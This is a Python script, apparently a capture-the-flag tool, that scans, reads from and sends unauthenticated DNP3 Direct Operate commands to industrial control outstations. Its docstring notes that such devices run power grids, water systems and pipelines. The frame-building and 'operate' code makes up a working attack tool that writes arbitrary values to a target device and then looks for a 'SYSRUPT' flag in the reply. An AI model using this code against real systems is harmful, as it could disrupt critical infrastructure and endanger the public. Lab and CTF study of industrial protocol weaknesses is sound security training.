#!/usr/bin/env python3
"""DNP3 Protocol Explorer

Options:
  -t, --target    Target IP address (required)
  -p, --port      Target port (default: 20000)
  -c, --command   Command: scan, read, operate
  -v, --value     Value for operate command (16-bit integer, decimal or 0xHEX)
  -h, --help      Show this help

DNP3 (Distributed Network Protocol 3):
    Used in power grids, water systems, oil/gas pipelines.
    Default port: 20000. No authentication by default.
"""

import argparse
import socket
import struct
import sys


DNP3_PORT = 20000
DNP3_START = bytes([0x05, 0x64])


def crc16_dnp(data):
    crc = 0x0000
    poly = 0xA6BC
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x0001:
                crc = (crc >> 1) ^ poly
            else:
                crc >>= 1
    return crc ^ 0xFFFF


def crc_append(block):
    c = crc16_dnp(block)
    return block + struct.pack("<H", c)


def build_link_frame(dest, src, ctrl, payload):
    length = 5 + len(payload)
    header = bytes([0x05, 0x64, length & 0xFF, ctrl & 0xFF]) + struct.pack("<HH", dest, src)
    frame = crc_append(header)
    for i in range(0, len(payload), 16):
        chunk = payload[i:i + 16]
        frame += crc_append(chunk)
    return frame


def build_read_request(dest=10, src=1):
    app_payload = bytes([0xC0, 0xC0, 0x01, 0x3C, 0x01, 0x06])
    return build_link_frame(dest, src, 0xC4, app_payload)


def build_operate_request(value, dest=10, src=1):
    val_lo = value & 0xFF
    val_hi = (value >> 8) & 0xFF
    app_payload = bytes([
        0xC0, 0xC1, 0x03,
        0x29, 0x02, 0x28, 0x01,
        0x00,
        val_lo, val_hi,
        0x00,
    ])
    return build_link_frame(dest, src, 0xC4, app_payload)


def strip_link_data_crcs(data_with_crcs, user_len):
    out = b""
    remaining = user_len
    pos = 0
    while remaining > 0:
        chunk = min(16, remaining)
        if pos + chunk <= len(data_with_crcs):
            out += data_with_crcs[pos:pos + chunk]
        pos += chunk + 2
        remaining -= chunk
    return out


def parse_response(data):
    if len(data) < 10 or data[:2] != DNP3_START:
        return None
    info = {
        "length": data[2],
        "destination": data[4] | (data[5] << 8),
        "source": data[6] | (data[7] << 8),
    }
    if len(data) > 12:
        app_start = 10
        if app_start + 2 < len(data):
            fc = data[app_start + 2]
            info["function_code"] = fc
            fc_names = {
                0x81: "Response", 0x82: "Unsolicited Response",
                0x01: "Read", 0x03: "Direct Operate", 0x05: "Select",
            }
            info["function_name"] = fc_names.get(fc, "Unknown (0x%02X)" % fc)
    return info


def send_recv(ip, port, packet, timeout=5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.send(packet)
        resp = s.recv(4096)
        return resp
    except (socket.timeout, ConnectionRefusedError):
        return None
    finally:
        s.close()


def cmd_scan(args):
    print("[*] Scanning %s:%d for DNP3 outstation..." % (args.target, args.port))
    print()
    pkt = build_read_request()
    resp = send_recv(args.target, args.port, pkt)
    if resp and resp[:2] == DNP3_START:
        info = parse_response(resp)
        print("[+] DNP3 outstation detected!")
        print("    Start bytes: 0x05 0x64 (confirmed)")
        print("    Response size: %d bytes" % len(resp))
        if info:
            print("    Source address: %d" % info.get("source", 0))
            print("    Destination address: %d" % info.get("destination", 0))
            if "function_name" in info:
                print("    Function: %s" % info["function_name"])
        print()
        print("[+] No authentication required!")
    else:
        print("[-] No response from %s:%d" % (args.target, args.port))


def cmd_read(args):
    print("[*] Reading data from %s:%d..." % (args.target, args.port))
    print()
    pkt = build_read_request()
    resp = send_recv(args.target, args.port, pkt)
    if not resp or resp[:2] != DNP3_START:
        print("[-] No valid response")
        return

    info = parse_response(resp)
    print("[+] DNP3 Response (%d bytes)" % len(resp))
    if info:
        print("    Source: %d  Destination: %d" % (info.get("source", 0), info.get("destination", 0)))
        if "function_name" in info:
            print("    Function: %s" % info["function_name"])

    try:
        user_len = max(resp[2] - 5, 0)
        body = resp[10:]
        payload = strip_link_data_crcs(body, user_len)
        obj_data = payload[5:] if len(payload) > 5 else b""

        pos = 0
        while pos + 4 < len(obj_data):
            group = obj_data[pos]
            variation = obj_data[pos + 1]
            qualifier = obj_data[pos + 2]
            pos += 3

            if qualifier != 0x01:
                break

            start = obj_data[pos]
            stop = obj_data[pos + 1]
            count = stop - start + 1
            pos += 2

            if group == 0x01 and variation == 0x02:
                print()
                print("    === BINARY INPUTS ===")
                for i in range(count):
                    if pos < len(obj_data):
                        flags = obj_data[pos]
                        print("    BI:%d = %s" % (start + i, "ON" if flags & 0x80 else "OFF"))
                        pos += 1

            elif group == 0x1E and variation == 0x02:
                print()
                print("    === ANALOG INPUTS ===")
                for i in range(count):
                    if pos + 2 < len(obj_data):
                        val = struct.unpack("<h", obj_data[pos+1:pos+3])[0]
                        print("    AI:%d = %d" % (start + i, val))
                        pos += 3

            elif group == 0x14 and variation == 0x01:
                print()
                print("    === COUNTERS ===")
                counter_vals = []
                for i in range(count):
                    if pos + 4 < len(obj_data):
                        val = struct.unpack("<I", obj_data[pos+1:pos+5])[0]
                        counter_vals.append(val)
                        ascii_ch = chr(val) if 32 <= val < 127 else "?"
                        print("    Counter:%d = %d  (0x%04X)  '%s'" % (start + i, val, val, ascii_ch))
                        pos += 5

                decoded = ""
                for v in counter_vals:
                    if 32 <= v < 127:
                        decoded += chr(v)
                if len(decoded) > 2:
                    print()
                    print("    [?] Counter values as ASCII: \"%s\"" % decoded)
                    print("    [?] This looks like an encoded message...")
            else:
                break
    except Exception:
        pass

    print()
    print("    === RAW FRAME ===")
    hex_data = resp.hex()
    for i in range(0, len(hex_data), 32):
        offset = i // 2
        hex_part = " ".join(hex_data[j:j+2] for j in range(i, min(i+32, len(hex_data)), 2))
        ascii_part = ""
        for j in range(offset, min(offset + 16, len(resp))):
            ch = resp[j]
            ascii_part += chr(ch) if 32 <= ch < 127 else "."
        print("    %04X: %-48s  %s" % (offset, hex_part, ascii_part))


def cmd_operate(args):
    if args.value is None:
        print("[-] Error: --value / -v is required for operate command")
        sys.exit(1)
    val_str = args.value
    value = int(val_str, 16) if val_str.startswith("0x") else int(val_str)
    value = value & 0xFFFF

    print("[*] Sending Direct Operate to %s:%d..." % (args.target, args.port))
    print("    Value: %d (0x%04X)" % (value, value))
    print()

    pkt = build_operate_request(value)
    resp = send_recv(args.target, args.port, pkt)
    if resp and resp[:2] == DNP3_START:
        info = parse_response(resp)
        print("[+] Outstation responded!")
        if info and "function_name" in info:
            print("    Function: %s" % info["function_name"])
        print()
        print("[+] Direct Operate accepted - no authentication!")

        # Check for flag in response - strip link layer CRCs first
        try:
            user_len = max(resp[2] - 5, 0)
            body = resp[10:]
            payload = strip_link_data_crcs(body, user_len)
            # Search for flag in the clean payload
            flag = ""
            for i in range(len(payload)):
                if payload[i:i+7] == b"SYSRUPT":
                    for j in range(i, len(payload)):
                        if payload[j] == ord("}"):
                            flag = payload[i:j+1].decode("ascii")
                            break
                    break
            if flag:
                print()
                print("    =============================================")
                print("    FLAG: %s" % flag)
                print("    =============================================")
        except Exception:
            pass
    else:
        print("[-] No response from %s:%d" % (args.target, args.port))


def main():
    parser = argparse.ArgumentParser(
        description="DNP3 Protocol Explorer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""DNP3 (Distributed Network Protocol 3):
  Used in power grids, water systems, oil/gas pipelines.
  Default port: 20000. No authentication by default."""
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=DNP3_PORT, help="Target port (default: 20000)")
    parser.add_argument("-c", "--command", required=True, choices=["scan", "read", "operate"],
                        help="Command to execute")
    parser.add_argument("-v", "--value", default=None,
                        help="Value for operate command (16-bit integer, decimal or 0xHEX)")

    args = parser.parse_args()

    if args.command == "scan":
        cmd_scan(args)
    elif args.command == "read":
        cmd_read(args)
    elif args.command == "operate":
        cmd_operate(args)


if __name__ == "__main__":
    main()
